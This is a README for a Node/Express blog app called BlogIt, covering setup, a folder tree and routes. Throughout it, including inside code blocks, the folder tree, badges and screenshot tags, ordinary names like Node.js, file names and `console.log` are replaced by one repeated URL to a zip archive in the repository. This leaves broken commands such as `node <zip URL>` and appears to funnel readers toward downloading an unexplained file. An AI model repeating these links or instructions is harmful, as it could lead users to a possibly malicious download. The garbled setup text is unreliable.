<div align="center">

# BlogIt — Full‑stack Blog App

A simple blog platform where users can sign up/sign in, create posts with cover images, and comment on posts.

<a><img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip%2B-brightgreen" /></a>
<a><img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip" /></a>
<a><img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip" /></a>
<a><img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip" /></a>
<a><img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip%205-7952B3" /></a>


</div>

---

## Overview

**BlogIt** is a classic, server‑rendered web app built with **https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip, Express, EJS, MongoDB/Mongoose, Multer, JWT cookies, and Bootstrap**.

Key capabilities:
- User auth with **JWT** stored in **HTTP‑only cookies** (custom middleware attaches `https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip`/`https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip`)
- Create/read blog posts with **image uploads** (Multer → `public/uploads/`)
- **Comments** on posts; author avatar + name rendered via **Mongoose `populate`**
- Clean, responsive UI with Bootstrap layout
- Input hardening (trim, **ObjectId** validation) and correct middleware order

---

## Tech Stack

- **Backend:** https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip, Express, Mongoose  
- **Views:** EJS, Bootstrap 5  
- **Auth:** JWT (cookie) + `cookie-parser`  
- **Uploads:** Multer (disk storage)  
- **Config:** `dotenv`

---

## Getting Started

### Prerequisites
- https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip **18+** and npm
- MongoDB running locally, or a MongoDB Atlas cluster

### 1) Clone & install
```bash
git clone <YOUR-REPO-URL>
cd blog-app
npm install
```

### 2) Environment variables
Create a **.env** in the project root:

```env
MONGO_URL=mongodb://localhost:27017/bloggify
JWT_SECRET=replace_with_a_long_random_string
PORT=8000
```

At the **top** of `https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip` (before reading any `https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip`):
```js
require('dotenv').config();
```

Sanity check (optional):
```js
https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip('MONGO_URL ->', https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip);
```

### 3) Create uploads folder
Multer writes to `./public/uploads/`. Make sure it exists:
```bash
mkdir -p public/uploads
```

### 4) Run
```bash
# if you have a dev script with nodemon
npm run dev

# or plain node
npm start
# or
node https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip
```
App will start on `http://localhost:8000` (or your `PORT`).

---

## Folder Structure

```
.
├─ public/
│  └─ uploads/           # Multer saves images here (served statically)
├─ views/                # EJS templates (partials, pages)
├─ models/
│  ├─ https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip
│  ├─ https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip
│  └─ https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip
├─ routes/
│  ├─ https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip
│  └─ https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip
├─ middlewares/
│  └─ https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip  # checkForAuthenticationCookie('token')
├─ https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip
├─ https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip
└─ .env
```

---

## Routes (Quick Reference)

### Home / Blogs
- `GET /` — List all blogs
- `GET /blog/add-new` — Render “new blog” form
- `POST /blog/` — Create blog (**Multer field:** `coverImage`)
- `GET /blog/:id` — View a single blog (populates `createdBy`)
- `POST /blog/comment/:blogId` — Add a comment to a blog

### Auth (examples)
- `GET /user/signin` — Sign in page
- `POST /user/signin` — Sign in (sets `token` cookie)
- `GET /user/signup` — Sign up page
- `POST /user/signup` — Create account
- *(optional)* `POST /user/logout` — Clear cookie

> The auth middleware reads the JWT from the **`token`** cookie and sets `https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip` / `https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip`.

---

## Screenshots

<p align="center">
  <!-- Replace with your own images -->
  <img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip" alt="Home" width="48%">
  <img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip" alt="Blog Detail" width="48%">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip" alt="Signin" width="32%">
  <img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip" alt="Create Post" width="32%">
  <img src="https://raw.githubusercontent.com/aayushv2003/BlogIT-App/main/wirework/BlogIT-App.zip" alt="Comments" width="32%">
</p>



<div align="center">
  <sub>Thank You.</sub>
</div>
